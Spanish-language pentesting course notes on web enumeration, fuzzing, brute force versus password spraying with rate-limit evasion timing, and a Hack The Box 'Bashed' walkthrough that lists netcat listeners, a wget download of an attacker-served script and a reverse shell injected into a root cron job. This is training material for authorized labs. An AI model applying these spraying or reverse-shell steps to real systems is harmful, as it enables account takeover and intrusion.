

> [!info] Relacionado con
> [[Apuntes/05 - Auditoria Web/Enumeración Web]] · [[Fuzzing Web con ffuf]] · [[Burp Suite - Framework de Auditoría]] · [[Nmap - Escaneo y Enumeración]]
> 

---

## ① Anatomía de una URL

Cada parte de la URL es un punto donde podemos **fuzzear**: subdominio, directorio, nombre de parámetro o valor de variable.

```
https://ejemplo.es/directorio?q=valor&page=2
 │ │ │ │ │ │
 │ │ │ │ │ ┘─ 2Âª variable (page) = valor (2)
 │ │ │ │ ┘─ separador de parámetros: &
 │ │ │ ┘─ variable (q) = valor
 │ │ ┘─ directorio / ruta
 │ ┘─ dominio (.es = España, .com = global, .mx = México...)
 ┘─ protocolo (http, https, ftp, ssh, smb...) + 's' = capa segura sobre TCP/IP
```

| Componente | Detalle |
|------------|---------|
| **Protocolo** | Cómo se accede al recurso. La `s` de HTTPS es el subprotocolo seguro sobre TCP/IP |
| **Dominio** | Termina en un TLD que indica procedencia (`.es`, `.com`, `.mx`...) |
| **Parámetro** | Tras `?` empieza el primer parámetro; `variable=valor` |
| **Encadenamiento** | Para varios parámetros se usa `&` (ampersand). El `?` va **una sola vez**: `pagina?param1=valor1&param2=valor2` |

> [!important] Por qué importa esta anatomía
> Saber diferenciar las partes de una URL es lo que permite decidir **dónde inyectar el diccionario** en fuzzing.

---

## ② Endpoint: la pieza clave

Un **endpoint** es el receptor concreto de una petición. Este concepto es la clave para entender por qué unas técnicas se detectan y otras no:

| Acción | Resultado |
|--------|-----------|
| Cambiar el **valor** de una variable en el mismo directorio | **Mismo endpoint** (se repite el receptor) |
| Cambiar de **directorio, parámetro o usuario** | **Endpoints distintos** (cada uno es un receptor diferente) |

> [!tip] Analogía
> Imagina la clase con 35 alumnos. Preguntar «¿me dejas un euro?» a Mariana, a Chema, a Óscar... son **endpoints distintos** (personas distintas). Repetir «¿un euro? ¿un euro? ¿un euro?» a la **misma** persona es el mismo endpoint, y a la décima te cansa (te bloquea).

---

## ③ Códigos de estado HTTP

Al lanzar peticiones interpretamos la respuesta por su código:

| Código | Significado | Uso en enumeración |
|--------|-------------|-------------------|
| **200** | OK "” el recurso existe y responde | El directorio/recurso **está** (levantado) |
| **403** | Forbidden "” existe pero no autorizado | Existe, pero no nos deja entrar |
| **404** | Not Found "” no existe | El recurso **no** está |
| **301/302** | Redirección | Nos manda a otra ruta (ej. `/js` → `/js/`) |

> [!tip] Chuleta visual
> [http.cat](https://http.cat) tiene todos los códigos de estado HTTP con imágenes.

---

## ④ Fuerza bruta vs Password spraying vs Enumeración de directorios

Todas «lanzan muchas peticiones», pero se comportan de forma muy distinta frente a los mecanismos de defensa.

### Fuerza bruta

- Se lanza contra **el mismo endpoint** (por ejemplo, `wp-login.php?user=x&pass=?`), iterando el **valor** de una variable.
- Al golpear siempre el mismo receptor, es fácil que salte el **rate limit** y nos bloqueen.
- Es **exponencial**: no sabemos la longitud ni el juego de caracteres, así que el coste crece muchísimo.

> [!warning] Regla de oro
> La **fuerza bruta es lo último** que hay que intentar. Es ruidosa, lenta y muy probablemente no encuentre la contraseña por caracteres especiales, longitud y aleatoriedad.

### Password spraying

En lugar de probar muchas contraseñas contra un usuario, se prueba **una misma contraseña contra muchos usuarios** (cada usuario es un endpoint distinto). Cuando termina la tanda, se lanza la siguiente contraseña.

- Explota el factor humano: la contraseña más habitual suele ser **el nombre de la empresa + año** (`Empresa2026`, `Empresa2026!`, `Empresa2025`...).
- Al rotar entre usuarios, cuando se vuelve al primero ya ha pasado tiempo suficiente para no disparar el rate limit por usuario.
- Al contrario que la fuerza bruta, **es de las primeras cosas** que se prueban en un ejercicio real.

> [!danger] Solo en entornos autorizados
> Sobre un directorio activo de ~700 usuarios se lanza `Empresa2026` a todos; luego `Empresa2026!`; luego `Empresa2025` y `Empresa2025!`. Ese pequeño conjunto de combinaciones suele sacar un porcentaje notable de usuarios. **Solo aplicable en entornos autorizados.**

### Enumeración de directorios (¿por qué NO te banean?)

Al descubrir directorios probamos `/admin`, `/login`, `/uploads`... es decir, **un endpoint distinto por cada petición**. El servidor solo ve tráfico repartido entre muchas rutas, que es un comportamiento normal de navegación.

```
Fuerza bruta → MISMO endpoint (mismo login) → salta rate limit
Password spraying → 1 pass a N usuarios (endpoints distintos) → evade rate limit
Enum. directorios → N rutas distintas (N endpoints) → no salta rate limit
```

> [!tip] Matiz sobre parámetros
> Si sobre el mismo directorio **iteras el valor** de una variable, es fuerza bruta (mismo endpoint). Si **iteras el nombre del parámetro o el directorio**, son endpoints distintos → se comporta como un spray. Por eso podemos enumerar parámetros ocultos sin bloqueos.

---

## ⑤ Rate limit, WAF y cálculo de delays

El **rate limit** es el número máximo de intentos permitidos por unidad de tiempo. Siempre tiene forma de `nº de intentos / tiempo`.

- Valor típico en web y en Active Directory: **3 intentos cada 5 minutos** (≈ 1 intento cada 100 s ≈ 1,5 min).
- Puede aplicarse por **usuario** (bloquea la cuenta) o por **IP** (número de requests que acepta un servidor).
- Un **WAF/SIEM/EDR** detecta patrones de comportamiento repetitivo y levanta *flags* que acaban en bloqueo.

### Cómo calcular el delay (con NetExec)

**NetExec lanza ~1 petición cada 0,5 s**. Con ese dato se estima cuánto tarda una vuelta completa:

| Escenario | Cálculo | Resultado |
|-----------|---------|-----------|
| **~5000 usuarios** | 5000 × 0,5 s = 2500 s ≈ 40 min | Al volver al primer usuario ya ha pasado >1 hora → **no hace falta delay** |
| **Pocos usuarios (ej. 6)** | 6 × 0,5 s = 3 s por vuelta | Demasiado rápido → hay que **meter un delay** (~1 min por petición) |

> [!tip] Regla mental
> Cuantos **menos usuarios**, **más delay**; cuantos más usuarios, el propio recorrido ya introduce el tiempo necesario.

### Tiempos de crackeo de contraseñas

El coste es **acumulativo**: antes de llegar a probar 14 caracteres, ya has tenido que agotar todas las de 13, 12, 11...

> [!warning] Por qué la fuerza bruta «está rara»
> Una contraseña de ~14 caracteres alfanuméricos con símbolos puede irse a cientos de millones de años. Y para llegar ahí primero recorres todas las longitudes menores. Por eso conviene evitarla y priorizar spraying o vectores más inteligentes.

---

## ⑥ La técnica estrella: Fuzzing

El **fuzzing** combina lo mejor de la fuerza bruta (probar muchas combinaciones de un diccionario) con lo mejor del listado de directorios (endpoints distintos, sin bloqueos). Su clave es el marcador **FUZZ**: donde lo colocamos, la herramienta sustituye cada entrada del diccionario.

```
# El marcador FUZZ se puede colocar en distintas posiciones:

https://FUZZ.dominio.es/ → descubrir SUBDOMINIOS
https://dominio.es/FUZZ → descubrir DIRECTORIOS
https://dominio.es/admin/FUZZ.php → descubrir FICHEROS/rutas
https://dominio.es/pagina?FUZZ=1 → descubrir NOMBRES de parámetros
https://dominio.es/pagina?id=FUZZ → descubrir VALORES de una variable
```

> [!tip] Ventaja del fuzzing
> Con **una sola herramienta** y el mismo enfoque podemos descubrir subdominios, directorios, parámetros y valores. Colocamos FUZZ donde queramos: esa flexibilidad es lo más importante de la técnica.

> [!info] Herramienta destacada: x8
> **x8** es una herramienta especializada en **enumerar parámetros ocultos** de una web (parámetros que no aparecen en la interfaz pero el backend sí procesa).

### ¿Cuándo listar directorios y cuándo fuzzear?

| Situación | Acción |
|-----------|--------|
| **Por defecto** | Listado de directorios de confianza (dirsearch). Es lo primero que se lanza |
| **No encuentras nada** con el listado estándar | **Fuzzear**: sospechas que hay algo oculto (subdominio, parámetro, funcionalidad) |
| **Probar el valor** de una variable | Fuzzing sin recurrir al Intruder de Burp Suite |

> [!tip] Típico en CTFs
> En máquinas vulnerables/CTFs casi siempre hace falta fuzzear porque el diccionario estándar no cubre rutas específicas de la máquina.

---

## ⑦ Metodología de pentesting y reconocimiento web

Toda la enumeración web se enmarca en la metodología por fases:

```
1. Enumeración → 2. Explotación → 3. Escalada de privilegios → 4. Persistencia → 5. Reporte
```

Camino habitual dentro de la enumeración web:

1. **Nmap** para detectar servicios. Si hay 80/443 o cualquier HTTP → **listado de directorios**.
2. Si es un **CMS**: WordPress → WPScan; Drupal → droopescan.
3. Mientras el listado corre en segundo plano, **conocer la web** (recon manual).

### La analogía de la discoteca (reconocimiento web)

Antes de explotar, hay que «conocer» la aplicación. El **WAF es el portero**: si te pasas de pesado, te echa. La idea es seducir sin que el portero te frene.

| Señal encontrada en la web | Vulnerabilidad potencial a investigar |
|---------------------------|--------------------------------------|
| Buscador / campo de búsqueda | [[OWASP Top 10 - CVE CVSS CWE|SQL Injection]] (interactúa con BD) |
| Formulario de registro o de contacto | SQL Injection (comunicación con el backend) |
| Blog / foro / comentarios | Cross-Site Scripting (XSS) |
| Directorio `/uploads` o de subida de ficheros | Subida de ficheros → posible ejecución (webshell) |
| Descarga de PDF (políticas, etc.) | XXE (XML External Entity) |
| No hace fetch de origen | SSRF (Server-Side Request Forgery) |
| Versión de PHP / software muy antigua | CVE con exploit público |
| Plantilla HTML / CMS con versión antigua | Vulnerabilidades propias de la plantilla/CMS |


> [!tip] Buena práctica de notas
> Todo hallazgo (usuario potencial, versión, ruta interesante, tecnología) se **apunta en el bloc de notas** aunque de momento se descarte. En enumeración, cuanto más recopilas, más vectores tienes después.

---

## ⑧ Caso práctico: máquina Bashed (Hack The Box)

> [!info] Entorno autorizado
> Todo el trabajo es en un **entorno autorizado de CTF**. La máquina Bashed de Hack The Box.

### Enumeración inicial

```bash
ping -c1 <IP> # comprobar ICMP / que la máquina responde
nmap -sCV -Pn <IP> # -Pn omite descubrimiento de host (no depende de ICMP)
```

> [!tip] Detalle sobre ICMP/ARP
> En máquinas alojadas en AWS un ping no devuelve nada porque **no hay ICMP ni ARP**. Ahí se usa `-Pn` para que Nmap no descarte el host.

- Si al abrir la web **carga**, no hay un DNS/vhost puesto a mano. Si **no carga** y da error, hay que encontrar el nombre y añadirlo a `/etc/hosts`.
- Con un puerto 80 abierto, se lanza el listado de directorios en segundo plano (**dirsearch**) mientras se hace el recon manual.

### Identificación de tecnologías

- Con **Wappalyzer** se identifica el stack: se detecta **Apache** y **PHP** en el servidor.
- Se anota la versión de Apache para buscar **CVEs** (se revisaron varias: WebDAV, mod_proxy FTP XSS, buffer/heap overflow, modo LDAP...) y se descartan las que no aplican.
- También aparece **jQuery** marcado como vulnerable "” en la práctica casi nunca es un vector real.

### Reconocimiento manual y descubrimiento de rutas

| Ruta / hallazgo | Observación |
|----------------|-------------|
| `/about.html` | Página «About». Aparece un autor → **usuario potencial** |
| `/config.php` | 0 bytes. Un `.php` se **ejecuta** en el navegador, no muestra el código fuente |
| `/contact.html` | Formulario sin backend real (comprobación solo en el front). Con Burp podría saltarse |
| `/images`, `/js`, `/php` | Directorios de recursos. `/js` y `/php` ejecutan PHP → interesantes para subir/ejecutar |
| `/uploads` | Directorio de subida → si logramos subir algo, posible **ejecución** |
| `/dev` | Directorio de desarrollo → aquí está la joya |
| Enlace a GitHub en el código | Apunta al **código fuente** de la herramienta instalada en el servidor |

> [!info] Por qué un `.php` se ve «vacío»
> Un `.html` o `.js` muestra su texto en el navegador. Un `.php` **se ejecuta** en el servidor y solo vemos el **resultado** de esa ejecución, no el código.

> [!info] La extensión del directorio no limita el intérprete
> Un fichero PHP subido a `/js` **también se ejecuta** como PHP: el nombre de la carpeta no define qué se interpreta. Si el servidor tiene PHP (Apache sobre Linux), ejecutará el `.php` esté donde esté.

### Explotación: webshell → reverse shell (www-data)

En `/dev` se encuentra `phpbash.php`, una **webshell** que da ejecución de comandos sin autenticación (RCE crítico).

```bash
# En la webshell:
whoami # -> www-data
ls # /var/www/html es la raíz por defecto de Apache
```

Como una webshell es incómoda, se monta una **reverse shell** propia. Usando revshells.com se genera un payload (Python) y se pone un *listener* con Netcat:

```bash
# En la máquina atacante (Kali):
nc -lvnp 4444

# En la webshell se pega el payload de reverse shell (Python) apuntando a nuestra IP:puerto.
```

> [!success] Compromiso inicial
> Se obtiene una **reverse shell como `www-data`** en unos minutos.

### Escalada de privilegios: www-data → script_manager

```bash
sudo -l
# Resultado: www-data puede ejecutar comandos como 'scriptmanager' SIN contraseña.

sudo -u scriptmanager -i # nos convertimos en scriptmanager (-i = shell interactiva)
```

> [!tip] Buena práctica al cambiar de usuario
> `sudo -u <usuario> -i` es más limpio que `sudo su`. El `-i` (interactive) nos da una sesión con entorno del usuario destino.

- En `/home` aparecen los usuarios `arrexel` (dueño de la máquina) y `scriptmanager`.
- La primera flag (`user.txt`) se encuentra en el directorio de **arrexel**.

### Escalada final: script_manager → root (cron + escritura de fichero)

En `/home/scriptmanager/scripts` hay dos ficheros clave:

| Fichero | Propietario | Nuestros permisos (como scriptmanager) |
|---------|-------------|----------------------------------------|
| `test.py` | scriptmanager | Lectura y **escritura** (es nuestro) |
| `test.txt` | root | Solo lectura |

Existe un **cron job** que ejecuta `test.py` **como root** de forma periódica. Se confirma observando que la **fecha de modificación** de los ficheros cambia sola.

```
cron (root) ejecuta test.py periódicamente
 →“
test.py es propiedad de scriptmanager → PODEMOS modificarlo
 →“
Inyectamos una reverse shell dentro de test.py
 →“
El cron ejecuta test.py como root → nos conecta una shell
 →“
Listener recibe la conexión → shell de ROOT
```

```bash
# Opción A "” escribir en una sola línea con echo (¡todo en 1 línea!):
echo 'import socket,subprocess,os; ...reverse shell python...' > /home/scriptmanager/scripts/test.py

# Opción B "” transferir el fichero preparado en local:
# En Kali (dentro de la carpeta con test.py):
python3 -m http.server 8000

# En la víctima:
wget http://10.10.14.x:8000/test.py -O /home/scriptmanager/scripts/test.py

# Listener para recibir la shell de root:
nc -lvnp 4440
```

> [!success] Objetivo cumplido
> Al ejecutarse el cron como root sobre nuestro `test.py` modificado, el *listener* recibe una **shell de root**. Máquina comprometida por completo.

> [!danger] Errores comunes vistos en directo
> - **Puerto del listener**: hay que abrir el nc en el **mismo puerto** que el payload
> - **Comandos en una sola línea**: en shells no interactivas, cuidado con saltos de línea y comillas mal cerradas al usar `echo`
> - **`test.txt` vs `test.py`**: la reverse shell hay que meterla en el fichero que ejecuta el cron (`test.py`), no en el `.txt` de solo lectura

---

## ⑨ Herramientas utilizadas en la sesión

| Herramienta | Objetivo | Fase | Nivel | Notas |
| ------------------------------------------------------------- | ---------------------------- | ---------------- | ----------- | --------------------------------- |
| **[[Nmap]]** | Detectar puertos y servicios | Enumeración | Recurrente | `-Pn` si no hay ICMP (AWS) |
| **[[DirSearch]]** | Listar directorios | Enum. web | Practicada | Default del profesor, en 2º plano |
| **[[FFUF]]** | Fuzzing (FUZZ) | Enum. web | Introducida | FUZZ en dir/param/subdominio |
| **Gobuster / dirb / [[Feroxbuster]]** | Listar directorios | Enum. web | Practicada | Unas con recursivo, otras no |
| **x8** | Enumerar parámetros ocultos | Enum. web | Mencionada | Nueva en el registro |
| **Wappalyzer** | Fingerprint de tecnologías | Enum. web | Introducida | Detecta Apache/PHP/CMS |
| **[[WordPress - Auditoría con WPScan|WPScan]]** / droopescan | Auditoría de CMS | Enum. web | Introducida | WP y Drupal respectivamente |
| **NetExec** | Spraying/auth en AD | Enum./Acceso | Introducida | ~1 req / 0,5 s |
| **[[Burp Suite - Framework de Auditoría|Burp Suite]]** | Interceptar/saltar front | Explotación | Practicada | Saltar validaciones de front |
| **revshells.com** | Generar reverse shells | Explotación | Practicada | Bash/nc/Python/PHP/perl |
| **Netcat (nc)** | Listener / conexiones | Explotación | Practicada | Recibir la reverse shell |
| **Python http.server** | Servir/transferir ficheros | Post-explotación | Introducida | Combinado con wget |

---

## ⑩ Comandos importantes

```bash
# --- Enumeración ---
ping -c1 <IP>
nmap -sCV -Pn <IP>
dirsearch -u http://<IP>/

# --- Fuzzing (marcador FUZZ) ---
ffuf -u http://<IP>/FUZZ -w <diccionario> -c # directorios
ffuf -u http://FUZZ.<dominio> -w <diccionario> -c # subdominios

# --- Explotación / shells ---
nc -lvnp 4444 # listener en Kali
whoami ; id ; ls -la # reconocimiento en la shell

# --- Escalada de privilegios ---
sudo -l # qué puedo ejecutar como sudo
sudo -u scriptmanager -i # cambiar de usuario
ls -la # revisar propietarios de ficheros

# --- Transferencia de ficheros ---
python3 -m http.server 8000 # en el atacante
wget http://10.10.14.x:8000/test.py -O test.py # en la víctima
```

---

## ⑪ Errores comunes y buenas prácticas

> [!danger] Errores comunes
> - Confundir **fuerza bruta** (mismo endpoint) con **spraying** (endpoints distintos)
> - Lanzar fuerza bruta como primera opción: ruidosa, lenta e improbable
> - Descuadre de **puertos** entre payload y listener
> - Meter la reverse shell en el fichero equivocado dentro de la cadena de escalada

> [!tip] Buenas prácticas
> - Primero **listado de directorios** (dirsearch); solo si no aparece nada, **fuzzear**
> - **Conocer** la web antes de explotar (analogía de la discoteca)
> - Apuntarlo **todo** en el bloc de notas: usuarios, versiones, rutas
> - Calcular **delays** en spraying según nº de usuarios para no superar el rate limit

---

## ⑫ Conexión con sesiones anteriores

- El **fuzzing con `FUZZ`** y [[FFUF]] ya apareció en la [[Explotación de Servicios - Linux|explotación de servicios web]] (puerto 80). Aquí se formaliza como técnica y se compara con el listado de directorios.
- El **descubrimiento de subdominios** enlaza con lo visto en [[OSINT - Metodología y Fuentes|OSINT / superficie de ataque]].
- La cadena **webshell → reverse shell → sudo → escalada** repite el patrón de máquinas anteriores (WordPress → theme editor → www-data, Mr. Robot, Oopsie/Archetype).
- La **escalada vía fichero ejecutado por root (cron)** conecta con el concepto de tareas programadas visto en la sesión previa.
- `sudo -l`, cambio de usuario y revisión de propietarios con `ls -la` son parte del *checklist* de [[Escalada de Privilegios]].

---

## ⑬ Resumen final

La sesión fija los cimientos de la **enumeración web**: leer una URL como quien hace un análisis sintáctico, entender el concepto de **endpoint** y, a partir de ahí, distinguir por qué la **fuerza bruta** salta alarmas mientras el **password spraying** y la **enumeración de directorios** las evitan. La técnica estrella es el **fuzzing** (marcador FUZZ en subdominio, directorio, parámetro o valor), con **x8** como utilidad específica para parámetros ocultos. Todo se cierra con una máquina de HTB (**Bashed**) resuelta de principio a fin: *phpbash* → reverse shell como www-data → sudo → scriptmanager → root aprovechando un cron que ejecuta un script modificable.

---

## ⑭ Checklist de repaso

- [ ] Sé identificar protocolo, dominio, directorio, parámetro y variable en una URL
- [ ] Explico qué es un endpoint y por qué es la clave de rate limit/spraying
- [ ] Diferencio fuerza bruta, password spraying y enumeración de directorios
- [ ] Sé qué es el rate limit y cómo calcular un delay según el nº de usuarios
- [ ] Entiendo el fuzzing y sé dónde colocar el marcador FUZZ
- [ ] Conozco x8 para enumerar parámetros ocultos
- [ ] Recuerdo las 5 fases de la metodología de pentesting
- [ ] Sé leer las señales del recon web (buscador→SQLi, uploads→webshell, etc.)
- [ ] Reproduzco la cadena de Bashed: phpbash → www-data → scriptmanager → root
- [ ] Sé transferir ficheros con http.server + wget y montar reverse shells con nc


---

## ⑮ Actualización del registro de herramientas

### Herramientas nuevas incorporadas

| Herramienta | Para qué sirve | Fase | Nivel |
| ------------- | ---------------------------------------------- | --------------- | ---------- |
| x8 | Enumeración de parámetros ocultos en web | Enumeración web | Mencionada |
| [[DirSearch]] | Listado de directorios (default del profesor) | Enumeración web | Practicada |
| revshells.com | Generador de reverse shells (recurso web) | Explotación | Practicada |
| droopescan | Auditoría de CMS Drupal (equivalente a WPScan) | Enumeración web | Mencionada |

### Conceptos/técnicas para el registro

- **Fuzzing** con marcador FUZZ (subdominio / directorio / parámetro / valor)
- **Password spraying** y su diferencia con fuerza bruta (endpoints)
- **Cálculo de delays** frente al rate limit (referencia: NetExec ~1 req/0,5 s)
- **Escalada por cron + fichero escribible** ejecutado como root
- Mapa de **recon web → vulnerabilidad** (analogía de la discoteca)

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Chema/Repaso de Enumeración Web.md|Repaso de Enumeración Web]— Escalada de Privilegios, GoBuster, XSS
- [[../../apuntes Chema/Maquinas/Auditoría de CMS — WordPress (máquina Academy).md|Auditoría de CMS — WordPress (máquina Academy)]— Escalada de Privilegios, GoBuster, XSS
- [[../../transcripciones/Julio/01.07.2026 Explotación Web WPScan File Upload y Reverse Shell en WordPress.md|01.07.2026 Explotación Web WPScan File Upload y Reverse Shell en WordPress]— Escalada de Privilegios, GoBuster, XSS
- [[../../apuntes Joselu/MODULO3/resumen_master_clase39.md|resumen_master_clase39]— Feroxbuster, GoBuster, XSS
- [[../../transcripciones/Julio/02.07.2026 Fuzzing, Directory Listing y Escalada por Script Hijacking.md|02.07.2026 Fuzzing, Directory Listing y Escalada por Script Hijacking]— Escalada de Privilegios, Windows, XSS
- [[../../apuntes Andres/02.07.2026 Fuzzing, Directory Listing y Escalada por Script Hijacking.md|02.07.2026 Fuzzing, Directory Listing y Escalada por Script Hijacking]— Escalada de Privilegios, Hack The Box, XSS

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/DirSearch|DirSearch]]
- [[comandos/Feroxbuster|Feroxbuster]]
- [[comandos/FFUF|FFUF]]
- [[comandos/GoBuster|GoBuster]]
- [[comandos/Hydra|Hydra]]
- [[comandos/Netcat|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SMB_Impacket|SMB / Impacket]]
- [[comandos/WPScan|WPScan]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
- [[Apuntes/05 - Auditoria Web/SSRF — Server-Side Request Forgery.md|SSRF]]
- [[Apuntes/05 - Auditoria Web/Vulnerabilidades Web — OWASP Top 10 y Burp Suite.md|XSS]]
- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #blue-team #burpsuite #command-injection #dirsearch #escalada-privilegios #feroxbuster #ffuf #file-upload #gobuster #hack-the-box #hydra #linux #netcat #nmap #osint #pentest #post-explotacion #redes #reverse-shell #smb-impacket #sqli #ssrf #windows #wordpress #wpscan #xss #xxe
